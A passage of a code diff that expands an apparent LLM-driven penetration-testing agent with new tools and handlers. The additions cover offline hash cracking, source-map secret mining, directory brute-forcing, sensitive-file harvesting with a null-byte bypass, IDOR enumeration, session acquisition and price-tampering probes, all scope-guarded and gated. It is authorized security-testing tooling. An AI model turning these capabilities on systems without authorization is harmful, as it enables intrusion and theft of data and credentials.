@@ -91,6 +91,31 @@ TOOL_PERMISSIONS = {
     "run_zap": PermissionLevel.INTRUSIVE,
     "run_dalfox": PermissionLevel.INTRUSIVE,
     "run_sqlmap": PermissionLevel.INTRUSIVE,
+    # ── capability expansion (2026-07) ──
+    "run_dork_gen": PermissionLevel.PASSIVE,       # offline query generation only
+    "run_hash_id": PermissionLevel.PASSIVE,        # offline hash-type identification
+    "run_sourcemap": PermissionLevel.ACTIVE,       # fetches *.js.map from in-scope host
+    "run_metadata": PermissionLevel.ACTIVE,        # fetches a file, extracts EXIF/metadata
+    "run_hash_crack": PermissionLevel.INTRUSIVE,   # OFFLINE dictionary crack of a supplied hash (never live auth)
+    "run_ferox": PermissionLevel.INTRUSIVE,        # optional feroxbuster adapter
+    "run_dirsearch": PermissionLevel.INTRUSIVE,    # optional dirsearch adapter
+    "run_gobuster": PermissionLevel.INTRUSIVE,     # optional gobuster adapter
+    "run_nosqlmap": PermissionLevel.INTRUSIVE,     # optional NoSQLMap adapter
+    "run_dir_harvest": PermissionLevel.INTRUSIVE,  # browsable-dir file harvest + null-byte bypass
+    # ── LLM investigative action primitives ──
+    "http_read": PermissionLevel.ACTIVE,           # scope-guarded SAFE-method request (read atom)
+    "http_diff": PermissionLevel.ACTIVE,           # deterministic two-request differential (oracle substrate)
+    "http_request": PermissionLevel.INTRUSIVE,     # scope-guarded ANY-method request (write atom, gated)
+    "confirm_idor": PermissionLevel.ACTIVE,        # deterministic IDOR/BOLA oracle-helper (auto-confirms)
+    "enumerate_ids": PermissionLevel.INTRUSIVE,    # bounded object-id enumeration (declarative, gated)
+    "acquire_session": PermissionLevel.ACTIVE,     # single authorized login → reusable named session (anti-brute-force capped)
+    "browser_navigate": PermissionLevel.ACTIVE,    # declarative headless-browser drive + client-state capture
+    "test_numeric_abuse": PermissionLevel.INTRUSIVE,  # business-logic numeric boundary probing (gated, never finalizes)
+    "mission_state": PermissionLevel.PASSIVE,      # read acquired identities/capabilities/chaining hints
+    "mission_intel": PermissionLevel.PASSIVE,      # read harvested target-intelligence candidates (fixtures)
+    "run_workflow": PermissionLevel.INTRUSIVE,     # execute a declarative technique-pack workflow (gated)
+    "list_workflows": PermissionLevel.PASSIVE,     # list reusable technique packs + required inputs
+    "benchmark_lab": PermissionLevel.ACTIVE,       # score coverage vs a known lab's completion oracle (separate module)
 }
 
 _UA = "Mozilla/5.0 (compatible; Apolaki/2.0; +authorized-testing)"
@@ -623,6 +648,174 @@ CLAUDE_TOOLS = [
          "cvss_score": {"type": "number"}, "cvss_vector": {"type": "string"}, "cwe": {"type": "string"},
          "evidence": {"type": "string"}},
          "required": ["title", "severity", "target", "description", "reproduction_steps", "impact"]}},
+    # ── capability expansion (2026-07) ──
+    {"name": "run_dork_gen",
+     "description": ("PASSIVE: Generate operator-ready search-engine dork queries for an in-scope host "
+                     "(scoped with site:). Offline — builds query TEXT only, never scrapes a search engine. "
+                     "Results are advisory recon leads."),
+     "input_schema": {"type": "object", "properties": {"target": {"type": "string"}}, "required": ["target"]}},
+    {"name": "run_hash_id",
+     "description": ("PASSIVE: Offline identification of hash types for already-obtained tokens (e.g. hashes dumped "
+                     "via a confirmed SQLi). Heuristic by length/charset/prefix; returns hashcat/John modes. "
+                     "No network, no target contact."),
+     "input_schema": {"type": "object", "properties": {
+         "hashes": {"type": "array", "items": {"type": "string"}}}, "required": ["hashes"]}},
+    {"name": "run_sourcemap",
+     "description": ("ACTIVE: Discover and analyse JavaScript source maps (*.js.map) for an in-scope JS bundle. "
+                     "Reconstructs original source and mines hidden routes, API endpoints, feature flags, and secrets "
+                     "(secrets stay leads until verified). Scope-guarded fetch."),
+     "input_schema": {"type": "object", "properties": {"url": {"type": "string", "description": "URL of a JS bundle"}},
+                      "required": ["url"]}},
+    {"name": "run_metadata",
+     "description": ("ACTIVE: Fetch an in-scope file (image/PDF/office) and extract embedded metadata (EXIF GPS, "
+                     "author, software, timestamps). Uses exiftool when present, else a native pure-python reader "
+                     "(graceful). Disclosed PII/location is a lead."),
+     "input_schema": {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}},
+    {"name": "run_hash_crack",
+     "description": ("INTRUSIVE (offline): Attempt an OFFLINE dictionary crack of a SUPPLIED hash against a local "
+                     "wordlist using hashcat or John (whichever is installed; skips gracefully if neither). This is "
+                     "offline analysis of a hash you already hold — it NEVER contacts a live authentication endpoint "
+                     "and NEVER brute-forces credentials over the network."),
+     "input_schema": {"type": "object", "properties": {
+         "hash": {"type": "string"}, "hash_type": {"type": "string", "description": "optional; auto-identified if omitted"},
+         "wordlist": {"type": "string", "description": "catalog id or absolute path; defaults to the common-passwords list"}},
+         "required": ["hash"]}},
+    {"name": "run_ferox",
+     "description": "INTRUSIVE: Recursive content discovery via feroxbuster (optional; skips gracefully if unavailable). Native content_discovery + ffuf remain the default.",
+     "input_schema": {"type": "object", "properties": {
+         "url": {"type": "string"}, "wordlist": {"type": "string"}}, "required": ["url"]}},
+    {"name": "run_dirsearch",
+     "description": "INTRUSIVE: Content discovery via dirsearch (optional; skips gracefully if unavailable).",
+     "input_schema": {"type": "object", "properties": {
+         "url": {"type": "string"}, "wordlist": {"type": "string"}}, "required": ["url"]}},
+    {"name": "run_gobuster",
+     "description": "INTRUSIVE: Directory brute-force via gobuster (optional; skips gracefully if unavailable).",
+     "input_schema": {"type": "object", "properties": {
+         "url": {"type": "string"}, "wordlist": {"type": "string"}}, "required": ["url"]}},
+    {"name": "run_nosqlmap",
+     "description": "INTRUSIVE: NoSQL-injection testing via NoSQLMap (optional; skips gracefully if unavailable). Native run_nosqli remains the default.",
+     "input_schema": {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}},
+    {"name": "run_dir_harvest",
+     "description": ("INTRUSIVE: Find browsable file directories (ftp/uploads/backup/…) and harvest sensitive files "
+                     "(confidential docs, source/DB backups, keys). On a blocked backup file, attempts a poison "
+                     "null-byte extension bypass. Scope-guarded; confirmed only when content is genuinely sensitive."),
+     "input_schema": {"type": "object", "properties": {"base_url": {"type": "string"}}, "required": ["base_url"]}},
+    {"name": "http_read",
+     "description": ("ACTIVE investigative primitive: send ONE scope-guarded read-only request (GET/HEAD/OPTIONS) with "
+                     "custom headers (e.g. an Authorization token you obtained) and get the response back "
+                     "(status/headers/body, secret-redacted). Use this to TEST a hypothesis: read another object's data "
+                     "(IDOR/BOLA), check whether a forged token authenticates, or enumerate. Off-scope is refused."),
+     "input_schema": {"type": "object", "properties": {
+         "method": {"type": "string", "enum": ["GET", "HEAD", "OPTIONS"], "default": "GET"},
+         "url": {"type": "string"}, "headers": {"type": "object"},
+         "session": {"type": "string", "description": "name of a session from acquire_session (acts as that identity)"},
+         "follow": {"type": "boolean", "default": True}}, "required": ["url"]}},
+    {"name": "http_diff",
+     "description": ("ACTIVE oracle primitive: send TWO scope-guarded read requests and return a DETERMINISTIC "
+                     "differential (status match, length delta, body similarity, distinct_objects flag). This is how you "
+                     "CONFIRM without guessing — e.g. request your own object vs another user's object and check they are "
+                     "distinct 200s. Provide {a:{url,headers}, b:{url,headers}}."),
+     "input_schema": {"type": "object", "properties": {
+         "a": {"type": "object"}, "b": {"type": "object"}}, "required": ["a", "b"]}},
+    {"name": "http_request",
+     "description": ("INTRUSIVE investigative primitive: send ONE scope-guarded request with ANY method + body "
+                     "(state-changing). Rides the approval gate. Use to attempt a WRITE test (add to another user's "
+                     "basket, submit a forged-token action, violate a business rule). Confirm the effect with a follow-up "
+                     "http_read/http_diff — never claim success from this call alone."),
+     "input_schema": {"type": "object", "properties": {
+         "method": {"type": "string", "default": "POST"}, "url": {"type": "string"},
+         "headers": {"type": "object"}, "body": {},
+         "session": {"type": "string", "description": "optional named session from acquire_session (acts as that identity)"},
+         "follow": {"type": "boolean", "default": True}}, "required": ["method", "url"]}},
+    {"name": "confirm_idor",
+     "description": ("ACTIVE oracle for IDOR/BOLA. STRONG proof needs TWO identities: pass target_url plus "
+                     "owner_session and attacker_session (from acquire_session). It confirms ONLY when the attacker "
+                     "reads the SAME object the owner sees (that is real cross-user access). With one identity "
+                     "(owned_url + session) it can only emit a LEAD — it cannot prove ownership from two distinct 200s. "
+                     "Always prefer the two-identity form for a confirmed finding."),
+     "input_schema": {"type": "object", "properties": {
+         "target_url": {"type": "string", "description": "the object (owned by the victim) to test"},
+         "owner_session": {"type": "string"}, "attacker_session": {"type": "string"},
+         "owner_headers": {"type": "object"}, "attacker_headers": {"type": "object"},
+         "owned_url": {"type": "string", "description": "single-identity fallback (lead only)"},
+         "session": {"type": "string"}, "headers": {"type": "object"}},
+         "required": ["target_url"]}},
+    {"name": "enumerate_ids",
+     "description": ("INTRUSIVE: bounded object-id enumeration on a templated URL (contains {id}). Give a numeric "
+                     "start/end (hard-capped at 50) and optional session; returns which ids are distinct "
+                     "populated 200s vs a nonexistent-id baseline. Emits a lead — confirm ownership with confirm_idor."),
+     "input_schema": {"type": "object", "properties": {
+         "url_template": {"type": "string"}, "start": {"type": "integer", "default": 1},
+         "end": {"type": "integer"}, "headers": {"type": "object"},
+         "session": {"type": "string", "description": "name of a session from acquire_session"}}, "required": ["url_template"]}},
+    {"name": "acquire_session",
+     "description": ("ACTIVE: log in ONCE with a supplied credential (JSON API or form) and store the session under a "
+                     "role name for reuse — then pass session=\"<role>\" to http_read/http_diff/confirm_idor/"
+                     "enumerate_ids to act as that identity. Acquire two roles (e.g. victim + attacker) to test "
+                     "cross-user access. This is authorized single-credential authentication, hard-capped — it NEVER "
+                     "iterates a password list. The token is stored server-side and never shown."),
+     "input_schema": {"type": "object", "properties": {
+         "login_url": {"type": "string"}, "username": {"type": "string"}, "email": {"type": "string"},
+         "password": {"type": "string"}, "role": {"type": "string", "default": "default"}},
+         "required": ["login_url", "password"]}},
+    {"name": "browser_navigate",
+     "description": ("ACTIVE: drive a real headless browser through a DECLARATIVE step list and capture the client-side "
+                     "state a DevTools session would show. Use for authenticated single-page-app flows (log in via the "
+                     "UI, then act) and to inspect what pure HTTP can't: localStorage/sessionStorage (tokens, feature "
+                     "flags), the XHR/fetch API calls the app makes (seeds the surface), loaded scripts, and DOM text. "
+                     "steps is a list of {action: goto|click|fill|press|wait, url?, selector?, value?, key?, ms?}. No "
+                     "arbitrary JavaScript. Every navigation is scope-checked; secret storage values are redacted."),
+     "input_schema": {"type": "object", "properties": {
+         "url": {"type": "string", "description": "starting URL"},
+         "steps": {"type": "array", "items": {"type": "object", "properties": {
+             "action": {"type": "string", "enum": ["goto", "click", "fill", "press", "wait"]},
+             "url": {"type": "string"}, "selector": {"type": "string"},
+             "value": {"type": "string"}, "key": {"type": "string"}, "ms": {"type": "integer"}}}},
+         "session": {"type": "string", "description": "optional named session from acquire_session"},
+         "promote_session": {"type": "string", "description": "after the flow, save the browser's auth (JWT/cookie) as this named session"}},
+         "required": ["url"]}},
+    {"name": "test_numeric_abuse",
+     "description": ("INTRUSIVE business-logic probe: send a numeric field (quantity/price/amount/limit) a benign "
+                     "control plus out-of-range values (negative/zero/huge/fractional) to a state-changing request and "
+                     "report which the server ACCEPTS but should reject. Never finalizes a payment or irreversible "
+                     "action. Emits a lead — verify the downstream effect (e.g. a negative total) with http_read."),
+     "input_schema": {"type": "object", "properties": {
+         "url": {"type": "string"}, "method": {"type": "string", "default": "POST"},
+         "param": {"type": "string", "description": "numeric field name; dot-path for nested (e.g. data.quantity)"},
+         "body": {"type": "object"}, "control": {}, "values": {"type": "array"},
+         "session": {"type": "string"}, "headers": {"type": "object"}}, "required": ["url", "param"]}},
+    {"name": "mission_state",
+     "description": ("PASSIVE: read the current investigation state — acquired identities, confirmed CAPABILITIES "
+                     "(database_read, foreign_object_read, admin_session, password_hash_obtained, …), objects seen, "
+                     "extracted variables, and chaining hints. Use it to plan the next step and chain capabilities."),
+     "input_schema": {"type": "object", "properties": {}, "required": []}},
+    {"name": "mission_intel",
+     "description": ("PASSIVE: read the Target Intelligence harvested from the target's own surface so far — "
+                     "candidates it leaked (emails, usernames, object-ids, routes, external URLs, decoded blobs, "
+                     "hints). Consume these as FIXTURES (a user-id to enumerate, a hidden route to hit, a decoded "
+                     "hint) instead of guessing — the general OSINT/source-review loop. Secrets are redacted."),
+     "input_schema": {"type": "object", "properties": {}, "required": []}},
+    {"name": "run_workflow",
+     "description": ("INTRUSIVE: execute a declarative technique-pack workflow. workflow = {id, requires:[capability:X], "
+                     "inputs:{var:val}, steps:[{do:http_read|http_request|confirm_idor|enumerate_ids|acquire_session|"
+                     "browser_navigate|test_numeric_abuse, as:<session>, extract:{var:'$.json.path' | {regex:'..'} | "
+                     "{header:'..'}}, ...}], assert:{field:confirmed,equals:true}|{capability:X}, produces:[capability:X]}. "
+                     "Variables {var} substitute into later steps. Reusable across targets — values come from inputs, not "
+                     "hardcoding. Confirmed findings come from confirm_* steps."),
+     "input_schema": {"type": "object", "properties": {"workflow": {"type": "object"},
+         "pack": {"type": "string", "description": "id of a built-in pack (see list_workflows)"},
+         "inputs": {"type": "object", "description": "input values for the pack"}}}},
+    {"name": "list_workflows",
+     "description": ("PASSIVE: list the built-in reusable technique packs (idor_read, bfla_privileged_action, "
+                     "price_quantity_tamper, object_id_sweep, …) and the inputs each needs. Run one with "
+                     "run_workflow{pack, inputs}."),
+     "input_schema": {"type": "object", "properties": {}, "required": []}},
+    {"name": "benchmark_lab",
+     "description": ("ACTIVE (lab benchmark only): score coverage against a known lab's completion oracle "
+                     "(juiceshop/dvwa), auto-detecting the lab from the page. Separate from detection — measurement "
+                     "only, never hardcoded into scanners."),
+     "input_schema": {"type": "object", "properties": {
+         "base_url": {"type": "string"}, "lab": {"type": "string"}}, "required": ["base_url"]}},
 ]
 
 
@@ -641,6 +834,23 @@ class ToolRegistry:
         # Authenticated scanning: headers (Cookie/Authorization) shared with every
         # HTTP request the tools make, so scans reach the post-login surface.
         self.session_headers = session_headers or {}
+        # Named sessions acquired at runtime by the investigative loop (role -> auth
+        # headers). The raw token is stored here and injected server-side; it is NEVER
+        # returned to the model. _login_attempts caps acquire_session to preserve the
+        # never-brute-force-credentials guarantee.
+        self._sessions = {}
+        self._login_attempts = 0
+        # capability-based investigation state (identities, ownership, capabilities, vars)
+        import investigation as _inv
+        self.state = _inv.InvestigationState()
+        self._Capability = _inv.Capability
+        # Target-intelligence store: every scoped fetch harvests candidates (emails, users,
+        # object-ids, routes, external URLs, encoded blobs, hints) into here so exploitation
+        # techniques can consume them as run-time FIXTURES (fixture_source=harvest). Secrets
+        # are redacted when this is serialized for the model / report / disk.
+        import intel as _intel
+        self.intel = _intel.IntelStore()
+        self._intel_mod = _intel
         # set by the agent so long ZAP polls can honor a user stop
         self.stop_event = None
         # Shared recon accumulator consumed by guidance + surface.
@@ -702,6 +912,899 @@ class ToolRegistry:
         except Exception as e:
             return "", str(e)
 
+    # ── capability-expansion tools (2026-07) ─────────────────────
+    async def _run_dork_gen(self, inp: dict) -> ToolResult:
+        """PASSIVE, offline: build operator-ready search-dork queries. No network."""
+        import dorks
+        target = (inp.get("target") or "").strip()
+        d = dorks.generate(target)
+        if not d["groups"]:
+            return ToolResult("dork_gen", target, False, "No valid host for dork generation", [])
+        # advisory recon lead carrying the ready-to-run queries (never a confirmed finding)
+        lead = {"title": f"Passive search-operator (dork) queries for {d['target']}",
+                "severity": "info", "family": "recon", "confidence": "lead",
+                "target": d["target"], "tags": ["osint", "dork", "passive"],
+                "description": "Operator-ready search queries (scoped with site:). Paste manually; not auto-scraped.",
+                "evidence": dorks.as_markdown(target)}
+        return ToolResult("dork_gen", d["target"], True,
+                          f"{len(d['flat'])} dork queries generated (offline)", [lead])
+
+    async def _run_hash_id(self, inp: dict) -> ToolResult:
+        """PASSIVE, offline: identify hash types for already-obtained tokens."""
+        import hashid_tool as hid
+        hashes = [h for h in (inp.get("hashes") or []) if isinstance(h, str)][:50]
+        ided = [{"hash": (h[:12] + "…") if len(h) > 12 else h, "candidates": hid.identify(h)}
+                for h in hashes if hid.identify(h)]
+        if not ided:
+            return ToolResult("hash_id", "", True, "No recognizable hashes", [])
+        lines = [f"- `{r['hash']}` → " + ", ".join(c["name"] for c in r["candidates"][:3]) for r in ided]
+        lead = {"title": f"Hash identification ({len(ided)} token(s))", "severity": "info",
+                "family": "crypto", "confidence": "lead", "tags": ["hash", "offline"],
+                "description": "Offline hash-type identification of already-obtained tokens.",
+                "evidence": "\n".join(lines)}
+        return ToolResult("hash_id", "", True, f"{len(ided)} hash(es) identified", [lead])
+
+    async def _run_sourcemap(self, inp: dict) -> ToolResult:
+        """ACTIVE: fetch + analyse a JS bundle's source map for hidden routes/APIs/secrets."""
+        import httpx
+        import sourcemap_tool as sm
+        url = (inp.get("url") or "").strip()
+        if not self.scope.validate(url)[0]:
+            return ToolResult("sourcemap", url, False, "Off-scope", [])
+        headers = {"User-Agent": _UA, **(self.session_headers or {})}
+        findings, analysed = [], None
+        async with httpx.AsyncClient(verify=False, follow_redirects=True, headers=headers, timeout=25) as c:
+            body = ""
+            if not url.endswith(".map"):
+                try:
+                    body = (await c.get(url)).text
+                except Exception:
+                    body = ""
+            for map_url in ([url] if url.endswith(".map") else sm.candidate_map_urls(url, body)):
+                if not self.scope.validate(map_url)[0]:
+                    continue
+                try:
+                    r = await c.get(map_url)
+                except Exception:
+                    continue
+                if r.status_code != 200:
+                    continue
+                parsed = sm.parse(r.text)
+                if not parsed["sources"] and not parsed["content"]:
+                    continue
+                analysed = sm.analyze(parsed)
+                # seed discovered endpoints into the surface (each re-validated by _add_urls)
+                base = re.match(r"(https?://[^/]+)", url)
+                if base and analysed["endpoints"]:
+                    self._add_urls([base.group(1) + e for e in analysed["endpoints"] if e.startswith("/")])
+                # secrets/routes/flags are LEADS (truth-first) until a human verifies them
+                ev = ("Source map: %s\nHidden sources: %d\nRoutes: %s\nFeature flags: %s\nEndpoints: %d"
+                      % (map_url, len(analysed["sources"]), ", ".join(analysed["routes"][:15]) or "-",
+                         ", ".join(analysed["feature_flags"][:10]) or "-", len(analysed["endpoints"])))
+                findings.append({"title": f"Source map exposed ({map_url.rsplit('/', 1)[-1]})",
+                                 "severity": "low", "family": "exposure", "confidence": "lead",
+                                 "target": map_url, "tags": ["source-map", "info-disclosure"],
+                                 "description": ("A JavaScript source map exposes original source, revealing internal "
+                                                 "routes, API endpoints, feature flags and possible secrets."),
+                                 "evidence": ev})
+                for s in analysed["secrets"]:
+                    s = dict(s); s["confidence"] = "lead"; s["target"] = map_url
+                    findings.append(s)
+                break
+        if not analysed:
+            return ToolResult("sourcemap", url, True, "No source map found", [])
+        return ToolResult("sourcemap", url, True,
+                          f"source map analysed: {len(analysed['routes'])} routes, "
+                          f"{len(analysed['endpoints'])} endpoints, {len(analysed['secrets'])} secret lead(s)",
+                          findings)
+
+    async def _run_metadata(self, inp: dict) -> ToolResult:
+        """ACTIVE: fetch an in-scope file and extract embedded metadata (exiftool or native)."""
+        import httpx
+        import tempfile
+        import upload_tool  # native metadata fallback lives here
+        url = (inp.get("url") or "").strip()
+        if not self.scope.validate(url)[0]:
+            return ToolResult("metadata", url, False, "Off-scope", [])
+        headers = {"User-Agent": _UA, **(self.session_headers or {})}
+        try:
+            async with httpx.AsyncClient(verify=False, follow_redirects=True, headers=headers, timeout=25) as c:
+                r = await c.get(url)
+                data = r.content[:8_000_000]
+        except Exception as e:
+            return ToolResult("metadata", url, False, f"fetch failed: {e}", [])
+        meta, tool_used = {}, "native"
+        if shutil.which("exiftool"):
+            with tempfile.NamedTemporaryFile(delete=False, suffix=os.path.splitext(url.split("?")[0])[-1]) as tf:
+                tf.write(data); tmp = tf.name
+            out, _ = await self._cmd(["exiftool", "-j", "-n", tmp], timeout=30)
+            try:
+                os.unlink(tmp)
+            except OSError:
+                pass
+            try:
+                arr = json.loads(out or "[]")
+                meta = arr[0] if arr else {}
+                tool_used = "exiftool"
+            except Exception:
+                meta = {}
+        if not meta:
+            meta = upload_tool.extract_metadata(data)  # native XMP/PDF/EXIF-ASCII fallback
+        interesting = {k: v for k, v in (meta or {}).items()
+                       if any(h in k.lower() for h in ("gps", "location", "author", "creator", "artist",
+                                                       "owner", "software", "make", "model", "email", "coord"))}
+        if not interesting:
+            return ToolResult("metadata", url, True, f"No sensitive metadata ({tool_used})", [])
+        ev = "\n".join(f"{k}: {v}" for k, v in list(interesting.items())[:25])
+        sev = "medium" if any("gps" in k.lower() or "location" in k.lower() or "coord" in k.lower()
+                              for k in interesting) else "low"
+        lead = {"title": "Sensitive metadata in served file", "severity": sev, "family": "exposure",
+                "confidence": "lead", "target": url, "tags": ["metadata", "info-disclosure", tool_used],
+                "description": ("A downloadable file embeds metadata (GPS location, author, device, or software), "
+                                "which can deanonymize users or leak internal details."),
+                "evidence": ev}
+        return ToolResult("metadata", url, True, f"metadata extracted ({tool_used})", [lead])
+
+    async def _run_hash_crack(self, inp: dict) -> ToolResult:
+        """INTRUSIVE (offline): dictionary-crack a SUPPLIED hash with hashcat/John against a
+        LOCAL wordlist. Offline analysis of a hash already held — never contacts a live auth
+        endpoint, never brute-forces credentials over the network."""
+        import tempfile
+        import wordlists as wl
+        import hashid_tool as hid
+        h = (inp.get("hash") or "").strip()
+        if not h or " " in h or len(h) > 4096:
+            return ToolResult("hash_crack", "", False, "No valid single hash supplied", [])
+        cands = hid.identify(h)
+        # resolve wordlist: catalog id -> temp file, or an absolute path
+        wlspec = inp.get("wordlist") or "passwords-common"
+        wl_path = None
+        if os.path.isabs(wlspec) and os.path.isfile(wlspec):
+            wl_path = wlspec
+        else:
+            words = wl.get_words(wlspec) or wl.get_words("passwords-common")
+            with tempfile.NamedTemporaryFile("w", delete=False, suffix=".txt") as tf:
+                tf.write("\n".join(words)); wl_path = tf.name
+        with tempfile.NamedTemporaryFile("w", delete=False, suffix=".hash") as hf:
+            hf.write(h); hash_file = hf.name
+        cracked, engine = "", ""
+        try:
+            if shutil.which("hashcat") and cands and cands[0].get("hashcat") is not None:
+                cmd = hid.hashcat_cmd(hash_file, wl_path, cands[0]["hashcat"])
+                await self._cmd(cmd, timeout=120)
+                out, _ = await self._cmd(cmd + ["--show"], timeout=30)
+                if out and ":" in out:
+                    cracked = out.strip().splitlines()[-1].split(":", 1)[-1]; engine = "hashcat"
+            elif shutil.which("john"):
+                fmt = cands[0].get("john") if cands else None
+                await self._cmd(hid.john_cmd(hash_file, wl_path, fmt), timeout=120)
+                out, _ = await self._cmd(["john", "--show"] + (["--format=" + fmt] if fmt else []) + [hash_file], timeout=30)
+                if out and ":" in out:
+                    cracked = out.strip().splitlines()[0].split(":", 1)[-1]; engine = "john"
+            else:
+                return ToolResult("hash_crack", "", True,
+                                  "Skipped — neither hashcat nor john installed (optional; offline-only feature)", [])
+        finally:
+            for p in (wl_path, hash_file):
+                try:
+                    if p and not (os.path.isabs(wlspec) and p == wlspec):
+                        os.unlink(p)
+                except OSError:
+                    pass
+        if not cracked:
+            return ToolResult("hash_crack", "", True, f"Not cracked with {wlspec} (offline dictionary)", [])
+        finding = {"title": "Weak password hash cracked offline", "severity": "high", "family": "crypto",
+                   "confidence": "confirmed", "target": "", "tags": ["hash", "offline-crack", engine],
+                   "description": ("A password hash (obtained during the assessment) was reversed offline with a "
+                                   "dictionary attack, proving weak/unsalted hashing and a guessable password."),
+                   "evidence": f"{engine} recovered the plaintext for the supplied {cands[0]['name'] if cands else 'hash'} (redacted).",
+                   "reproduction_steps": ["Load the extracted hash into hashcat/John offline",
+                                          "Run a wordlist attack (no network / no live auth)",
+                                          "Recover the plaintext"]}
+        return ToolResult("hash_crack", "", True, f"hash cracked offline ({engine})", [finding])
+
+    async def _bin_discovery(self, tool: str, cmd: list, url: str) -> ToolResult:
+        """Shared driver for optional content-discovery binaries (ferox/dirsearch/gobuster).
+        Scope-guarded, arg-array (no shell), graceful skip when the binary is absent."""
+        if not self.scope.validate(url)[0]:
+            return ToolResult(tool, url, False, "Off-scope", [])
+        out, err = await self._cmd(cmd, timeout=300)
+        if err.startswith("__MISSING__"):
+            return ToolResult(tool, url, False, "", [], f"{cmd[0]} not installed (native content_discovery + ffuf remain available)")
+        paths = sorted(set(re.findall(r"https?://[^\s\"']+", out or "")))[:400]
+        in_scope = [p for p in paths if self.scope.validate(p)[0]]
+        self._add_urls(in_scope)
+        leads = []
+        if in_scope:
+            leads.append({"title": f"Content discovered via {cmd[0]} ({len(in_scope)} path(s))",
+                          "severity": "info", "family": "recon", "confidence": "lead", "target": url,
+                          "tags": ["content-discovery", cmd[0]],
+                          "description": f"{cmd[0]} enumerated in-scope paths (verify each before reporting).",
+                          "evidence": "\n".join(in_scope[:60])})
+        return ToolResult(tool, url, True, f"{cmd[0]}: {len(in_scope)} in-scope path(s)", leads)
+
+    async def _run_ferox(self, inp: dict) -> ToolResult:
+        url = (inp.get("url") or "").strip()
+        wl = inp.get("wordlist") or "/usr/share/seclists/Discovery/Web-Content/common.txt"
+        return await self._bin_discovery("ferox", ["feroxbuster", "-u", url, "-w", wl,
+                                                   "--silent", "--no-recursion", "-k"], url)
+
+    async def _run_dirsearch(self, inp: dict) -> ToolResult:
+        url = (inp.get("url") or "").strip()
+        cmd = ["dirsearch", "-u", url, "-q", "--format=plain"]
+        if inp.get("wordlist"):
+            cmd += ["-w", inp["wordlist"]]
+        return await self._bin_discovery("dirsearch", cmd, url)
+
+    async def _run_gobuster(self, inp: dict) -> ToolResult:
+        url = (inp.get("url") or "").strip()
+        wl = inp.get("wordlist") or "/usr/share/seclists/Discovery/Web-Content/common.txt"
+        return await self._bin_discovery("gobuster", ["gobuster", "dir", "-u", url, "-w", wl,
+                                                      "-q", "--no-color", "-k"], url)
+
+    async def _run_nosqlmap(self, inp: dict) -> ToolResult:
+        """Optional NoSQLMap adapter; native run_nosqli remains the default engine."""
+        url = (inp.get("url") or "").strip()
+        if not self.scope.validate(url)[0]:
+            return ToolResult("nosqlmap", url, False, "Off-scope", [])
+        out, err = await self._cmd(["nosqlmap", "--url", url], timeout=300)
+        if err.startswith("__MISSING__"):
+            return ToolResult("nosqlmap", url, False, "", [], "nosqlmap not installed (native run_nosqli remains available)")
+        hit = bool(re.search(r"injectable|vulnerable|payload", out or "", re.I))
+        leads = []
+        if hit:
+            leads.append({"title": "NoSQL injection signal (NoSQLMap)", "severity": "medium",
+                          "family": "nosqli", "confidence": "lead", "target": url, "tags": ["nosqli", "nosqlmap"],
+                          "description": "NoSQLMap reported a NoSQL-injection signal (verify with native run_nosqli).",
+                          "evidence": (out or "")[:800]})
+        return ToolResult("nosqlmap", url, True, "nosqlmap completed", leads)
+
+    async def _run_dir_harvest(self, inp: dict) -> ToolResult:
+        """INTRUSIVE: find browsable file directories (ftp/uploads/backup/…) and harvest
+        sensitive files; on a blocked backup file, try a poison-null-byte extension bypass.
+        Scope-guarded, bounded, confirmed only when content is genuinely sensitive."""
+        import httpx
+        import exposure_tool as exp
+        base = inp.get("base_url") or inp.get("url") or ""
+        m = re.match(r"(https?://[^/]+)", base)
+        if not m:
+            return ToolResult("dir_harvest", base, False, "No base URL", [])
+        origin = m.group(1)
+        if not self.scope.validate(origin)[0]:
+            return ToolResult("dir_harvest", origin, False, "Off-scope", [])
+        headers = {"User-Agent": _UA, **(self.session_headers or {})}
+        findings, harvested = [], 0
+        async with httpx.AsyncClient(verify=False, follow_redirects=True, headers=headers, timeout=20) as c:
+            async def get(u):
+                if not self.scope.validate(u)[0]:
+                    return None
+                try:
+                    return await c.get(u)
+                except Exception:
+                    return None
+            for d in exp.DIR_CANDIDATES[:20]:
+                if harvested >= 60:
+                    break
+                r = await get(origin + "/" + d)
+                if r is None or r.status_code != 200 or not exp.looks_like_listing(r.text):
+                    continue
+                for fp in exp.parse_listing(r.text):
+                    if harvested >= 60:
+                        break
+                    if not exp.is_harvestable(fp):
+                        continue
+                    furl = origin + "/" + fp.lstrip("/")
+                    fr = await get(furl)
+                    if fr is None:
+                        continue
+                    if fr.status_code == 200 and exp._SENSITIVE_SIG.search(fr.text or ""):
+                        harvested += 1
+                        findings.append(self._attach_poc(exp.harvest_finding(furl, fp, False, fr.text), furl, fr))
+                    elif fr.status_code in (401, 403):
+                        for nb in exp.nullbyte_variants(fp):
+                            nbr = await get(origin + "/" + nb.lstrip("/"))
+                            if nbr is not None and nbr.status_code == 200 and (nbr.text or "").strip():
+                                harvested += 1
+                                findings.append(self._attach_poc(
+                                    exp.harvest_finding(origin + "/" + nb.lstrip("/"), fp, True, nbr.text),
+                                    origin + "/" + nb.lstrip("/"), nbr))
+                                break
+        if harvested:
+            self.state.add_capability(self._Capability.ARBITRARY_FILE_READ, f"harvested {harvested} exposed file(s)")
+        return ToolResult("dir_harvest", origin, True, f"harvested {harvested} sensitive file(s)", findings)
+
+    # ── LLM investigative action primitives (2026-07) ────────────
+    # These hand the ReAct loop the ATOMS of manual testing — craft/modify/send a scoped
+    # request, and diff two responses — so the model can run discover→hypothesize→test→
+    # compare→adapt→confirm instead of only firing canned scanners. Every call is
+    # scope-guarded here (defence in depth on top of the wrapper), the response is
+    # size-capped and secret-redacted before the model sees it, and permission classes
+    # do the rest: http_read is ACTIVE (safe methods, ungated); http_request is INTRUSIVE
+    # (any method/body, rides the HITL gate). The model still cannot store a finding
+    # without evidence — confirmation is a deterministic diff, never the model's opinion.
+    _SAFE_METHODS = ("GET", "HEAD", "OPTIONS")
+    _RESP_CAP = 4000
+
+    def _shape_response(self, r, elapsed: float) -> dict:
+        """Model-visible response view: status, safe headers, capped+redacted body."""
+        import poc as _poc
+        hdrs = {}
+        for k, v in (r.headers.items() if r is not None else []):
+            if k.lower() in ("set-cookie", "authorization", "proxy-authorization"):
+                hdrs[k] = "<redacted>"
+            else:
+                hdrs[k] = v[:300]
+        body = (r.text if r is not None else "")[: self._RESP_CAP]
+        try:
